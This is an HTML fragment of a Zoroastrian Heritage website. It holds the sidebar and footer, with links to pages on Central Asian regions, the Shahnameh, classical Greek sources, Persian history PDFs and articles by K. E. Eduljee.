<p class="sidebar1"><b><a title="Tajikistan Region & Zoroastrian History" href="http://www.heritageinstitute.com/zoroastrianism/tajikistan/index.htm">Tajikistan Region</a></b></p>
<p class="sidebar1"><b><a title="Uzbekistan Region & Zoroastrian History" href="http://www.heritageinstitute.com/zoroastrianism/uzbekistan/index.htm">Uzbekistan Region</a></b></p>
<p class="sidebar1"><b><a title="Turkmenistan Region & Zoroastrian History" href="http://www.heritageinstitute.com/zoroastrianism/turkmenistan/index.htm">Turkmenistan Region</a></b></p>

<p class="sidebar1"><b><a title="Present Cave Dwellings" href="http://www.heritageinstitute.com/zoroastrianism/urmia/kandovan_2.htm">Present Cave Dwellings</a></b></p>
<p class="sidebar1"><a title="Kandovan Cave Village Introduction" 									href="urmia/kandovan_2.htm">- Kandovan Cave Village Introduction</a></p>
<p class="sidebar1"><a title="Kandovan Cave Village Photo Tour" 									href="urmia/kandovan.htm">- Kandovan Cave Village Photo Tour</a></p>
<p class="sidebar1"><a title="Maymand - Troglodyte Villages" 										href="aryans/prehistory.htm">- Maymand - Troglodyte Village</a></p>
 
<!--webbot bot="Include" i-checksum="51630" endspan --><br>
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepagesShahnameh.shtml" TAG="BODY" startspan -->
<h2><a title="The poet Ferdowsi's Shahnameh" href="shahnameh/index.htm">Shahnameh</a></h2>
<p class="sidebar1"><a title="The poet Ferdowsi & His Work. An introduction" href="shahnameh/index.htm">Ferdowsi & His Work</a></p>
<p class="sidebar1"><a title="Antique Shahnameh's Manuscript Copies" href="shahnameh/manuscripts.htm">Shahnameh Manuscripts</a></p>
<p class="sidebar1"><a title="The Shahnameh's Characters" href="shahnameh/characters.htm">Shahnameh's Characters</a></p>
<p class="sidebar1"><a title="The Heroes - Story in Brief" href="shahnameh/heros.htm">The Heroes - Story in Brief</a></p>
<p class="sidebar1"><a title="The poet Ferdowsi's Shahnameh. The Epic in English" href="shahnameh/page01.htm">Shahnameh in English</a></p>
<!--webbot bot="Include" i-checksum="36943" endspan --><br>
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepagesReference.shtml" TAG="BODY" startspan -->
<h2><a title="References. Classical & western suthors, maps, dictionary, links" href="contents_reference.htm">References</a></h2>
<h4>Greek Classics</h4>
<p class="sidebar1"><a title="Strabo's Geography. Book XV, Chapter 3" href="reference/strabo.htm">Strabo</a></p>
<p class="sidebar1"><a title="Herodotus: Histories" href="reference/herodotus_histories1.htm">Herodotus' Histories</a></p>
<p class="sidebar1"><a title="Herodotus: On The Customs of the Persians" href="reference/herodotus.htm">Herodotus on Persians</a></p>
<p class="sidebar1"><a title="Herodotus: On Scythians" href="reference/herodotus_scythia.htm">Herodotus on Scythians</a></p>
<p class="sidebar1"><a title="Xenophon's Anabasis. Expedition of Cyrus the Younger" href="reference/xenophon/anabasis/anabasis1.htm">Xenophon's Anabasis</a></p>
<p class="sidebar1"><a title="Xenophon's Cyropaedia. Education of Cyrus I, the Great" href="reference/xenophon/cyropaedia/cyropaedia1.htm">Xenophon's Cyropaedia</a></p>
<p class="sidebar1"><a title="Ptolemy, Book 6" href="reference/ptolemy/index.htm">Ptolemy Bk. 6</a></p>
<p class="sidebar1"><a title="Ptolemy, Book 6" href="reference/isidorus.htm">Parthian Stations by Isidorus</a></p>
<p class="sidebar1"><a title="The Persians by Aeschylus" href="reference/aeschylus.htm">The Persians by Aeschylus</a></p>

<h4>History of Persia</h4>
<p class="sidebar1"><a title="A.W.Jackson - Persia Past and Present - an Adode Acrobat file" href="pdf/JacksonPersiaPastPresent.pdf">Jackson's Persia Past Present (pdf file)</a><br></p>
<p class="sidebar1"><a title="Sir Percy Sykes - History of Persia Vol. 1- an Adode Acrobat file" href="pdf/Sykes_History_of_persia1.pdf">Sykes' History of Persia Vol 1 (pdf file)</a><br></p>
<p class="sidebar1"><a title="Sir Percy Sykes - History of Persia Vol. 12 - an Adode Acrobat file" href="pdf/Sykes_History_of_persia2.pdf">Sykes' History of Persia Vol 2 (pdf file)</a><br></p>
<p class="sidebar1"><a title="General Sketch of the History of Persia by Sir Clements Robert Markham - an Adode Acrobat file" href="pdf/markham_history_of_persia.pdf">Markham's History of Persia (pdf file)</a><br></p>
<p class="sidebar1"><a title="George Rawilson's Seventh Great Monarchy, a history of the Chaldea, Assyria, Media, Babylon, Persia, Parthia, Sassians" href="rawlinson/index.htm">Rawlinson: Seven Great Monarchies</a></p>
<p class="sidebar1"><a title="The Story of Media, Babylon and Persia: Including a Study of the Zend-Avesta by Z�na�de Alexe�evna Ragozin - an Adode Acrobat file" href="pdf/Story_of_Media__Babylon_Persia_Ragozin.pdf">Ragozin: Media Babylon Persia & Avesta (pdf)</a><br></p>

<h4>Philosophy</h4>
<p class="sidebar1"><a title="Friedrich Nietzsche. Thus Spake Zarathustra" href="westernauthors/nietzsche.htm">Friedrich Nietzsche</a><br></p>
<p class="sidebar1"><a title="Thus Spake Zarathushtra (text)" href="westernauthors/nietzschezarathushtraInt.htm">- Thus Spake Zarathustra (text)</a><br></p>
<p class="sidebar1"><a title="Thus Spake Zarathushtra videos" href="westernauthors/nietzscheVideo.htm">- Thus Spake Zarathustra videos</a><br></p>
<p class="sidebar1"><a title="Zoroastrian Ethics by Maganlal Amritlal Buch (1919) - an Adode Acrobat file" href="pdf/zoroastrianEthics.pdf">Zoroastrian Ethics by MA Buch (pdf)</a><br></p>

<h4> Western Authors & Zoroastrianism</h4>
<p class="sidebar1"><a title="The introduction to James Darmesteter's Sacred Books of the East, Volume 4" href="reference/darmesteter1.htm">Darmesteter Introduction</a></p>
<p class="sidebar1"><a title="Goethe's Parsi Nameh" href="goethe/index.htm">- Goethe's Parsi Nameh</a></p>
<p class="sidebar1"><a title="Helen Gerth: Zoroastrians on the Internet, a quiet social
movement: Ethnography of a virtual community" href="pdf/helengerth.pdf">- Helen Gerth: Zoroastrians on the Internet</a></p>
<p class="sidebar1"><a title="Sacred Language, Writings, and religion of the Parsees - an Adode Acrobat file" href="pdf/martin_haug_essays.pdf">Martin Haug on Zoroastrianism (pdf)</a><br></p>
<p class="sidebar1"><a title="Sacred Language, Writings, and religion of the Parsees by Martin Haug - an Adode Acrobat file" href="pdf/martin_haug_essays.pdf">- Essays: History, Grammar, Avesta (pdf)</a><br></p>
<p class="sidebar1"><a title="Lecture on an Original Speech of Zoroaster (Yasna 45), With Remarks on His Age
 by Martin Haug - an Adode Acrobat file" href="pdf/martin_haug_lecture.pdf">- Lecture: Yasna 45 (pdf)</a><br></p>
<p class="sidebar1"><a title="A.W.Jackson - Persia Past and Present - an Adode Acrobat file" href="pdf/JacksonPersiaPastPresent.pdf">Jackson's Persia Past Present (pdf file)</a><br></p>

<h2>Other References</h2>
<p class="sidebar1"><a title="A gallery of modern and historucal maps" href="maps/index.htm">Map Gallery</a></p>
<p class="sidebar1"><a title="Prehistoric Archaeological Ages & Periods. Categories & Eons of Time" href="reference/ages.htm">Prehistoric Ages. Categories of Time</a></p>
<p class="sidebar1"><a title="Zoroastrian Astrology in the Bundahishn" href="http://www.heritageinstitute.com/zoroastrianism/pdf/astrology.pdf">Astrology & Bundahishn (pdf)</a></p>
<!--webbot bot="Include" i-checksum="16279" endspan --><br>

<h2>Articles & Monographs</h2>
<p class="text" style="text-align: justify">
<a href="reference/amazons_eduljee.pdf">Amazons</a><br>
<a href="reference/december_25_yalda_eduljee.pdf">Yalda & Christmas</a><br>
<a href="reference/farohar_motif_eduljee.pdf">Farohar Motif-Complete</a><br>
<a href="reference/farohar_motif_eduljee_abridged.pdf">Farohar Motif-Abridged</a><br>
<a href="reference/int_winter_festivals_eduljee.pdf">Winter Festivals</a><br>			
<a href="reference/irandokht_eduljee.pdf">Irandokht</a><br>		
<a href="reference/madame_cama_abridged_eduljee.pdf">Madame Cama-Abridged</a><br>		
<a href="reference/madame_cama_complete_eduljee.pdf">Madame Cama-Complete</a><br>		
<a href="reference/nutrition_eduljee_abridged.pdf">Nutrition-Abridged</a><br>							
<a href="reference/nutrition_eduljee_complete.pdf">Nutrition-Complete</a><br>		
<a href="reference/vendidad_eduljee.pdf">Vendidad</a><br>		
<a href="reference/yalda_mithra_dec25_abridged_eduljee2016.pdf">Yalda Christmas Mithra-Abridged</a><br>
<a href="reference/yalda_mithra_dec25_detailed_eduljee2016.pdf">Yalda Christmas Mithra-Complete</a><br>
</p>

<!--webbot bot="Include" U-Include="included_content/sitepages/sitepagesLinks.shtml" TAG="BODY" startspan -->
<h2><a title="Links to Zoroastrian scriptures, translations, Avestan grammar, history, and other resources" target="_blank" href="links/index.htm">Resources & Links</a></h2>
<p class="sidebar1"><a title="Links to Zoroastrian scriptures, translations, Avestan grammar, history, and other resources" target="_blank" href="links/index.htm">Scriptures and other web resources</a></p>
<!--webbot bot="Include" i-checksum="62589" endspan --></td>
</tr></table></div>
</td></tr>
<!-- Main body lower end-->

<!-- footer -->
<tr><td width="100%">
<!--webbot bot="Include" U-Include="included_content/footer.htm" TAG="BODY" startspan -->

<!-- footer -->
<p id="footer" >
<br>
&#8226;&nbsp; � Author: K. E. Eduljee, <a target="_blank" href="http://www.zoroastrianheritage.com">Zoroastrian Heritage</a>, 2005-23 (researched from 1979 onwards) &nbsp; &#8226;&nbsp; <a title="Email us: enquiry@heritageinstitute.com" href="mailto:enquiry@heritageinstitute.com">Contact</a> &nbsp; &#8226;&nbsp; Page validated by W3C.org&nbsp;<a href="http://validator.w3.org/check?uri=referer"><img src="http://www.w3.org/Icons/valid-html401" alt="Valid HTML 4.01 Transitional" style="margin-bottom:-10px; height:20px; width:56px"></a>

</p>

<!--webbot bot="Include" i-checksum="29294" endspan --></td></tr></table>
</body>

</html>

<?php
}
?>
